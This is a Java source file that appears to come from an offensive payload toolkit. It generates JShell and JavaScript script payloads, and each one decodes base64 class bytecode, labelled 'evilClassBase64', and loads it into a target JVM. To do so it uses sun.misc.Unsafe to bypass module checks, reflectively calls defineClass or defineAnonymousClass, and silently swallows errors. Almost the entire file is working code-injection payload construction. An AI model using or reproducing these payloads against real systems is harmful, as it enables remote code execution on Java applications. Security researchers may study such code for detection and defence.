package com.h2tg.ysogate.bullet.defineClass;
import org.apache.commons.lang.StringEscapeUtils;
import java.util.Base64;
import static com.h2tg.ysogate.bullet.defineClass.JShellConverter.jshell2defineClass;

@Deprecated
public class EvalConverter
{

    public static String LoadByJshell(byte[] byteCode)
    {
        String b64 = Base64.getEncoder().encodeToString(byteCode);
        String javacode =
                "System.out.println(\"foo\");"+
                        "  class e {" +
                        "    static {" +
                        "        try {" +
                        "            String evilClassBase64 = \""+b64+"\";" +
                        "            Class unsafeClass = Class.forName(\"sun.misc.Unsafe\");" +
                        "            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\");" +
                        "            unsafeField.setAccessible(true);" +
                        "            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);" +
                        "            Module module = Object.class.getModule();" +
                        "            Class cls = e.class;" +
                        "            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\"));" +
                        "            unsafe.getAndSetObject(cls, offset, module);" +
                        "            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);" +
                        "            defineClass.setAccessible(true);" +
                        "            byte[] bytecode = java.util.Base64.getDecoder().decode(evilClassBase64);" +
                        "            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);" +
                        "            clazz.newInstance();" +
                        "        } catch (Exception e) {" +
                        "        }" +
                        "    }" +
                        "}"+" e a = new e();"
                ;
        String escaped = StringEscapeUtils.escapeJava(javacode);
//        System.out.println(javacode);
//        System.out.println(escaped);
        return escaped;
    }

    public static String LoadByJS(byte[] byteCode)
    {
        String b64 = Base64.getEncoder().encodeToString(byteCode);
        return "var bytes = java.util.Base64.getDecoder().decode('" + b64 + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";
    }

    public static String LoadByJS2(byte[] byteCode)
    {
        String b64 = Base64.getEncoder().encodeToString(byteCode);
        return "var s = '" + b64 + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
    }

    public static void main(String[] args)
    {
        String b64="123";
        String payload=jshell2defineClass(b64);
        System.out.println(payload);
    }

}
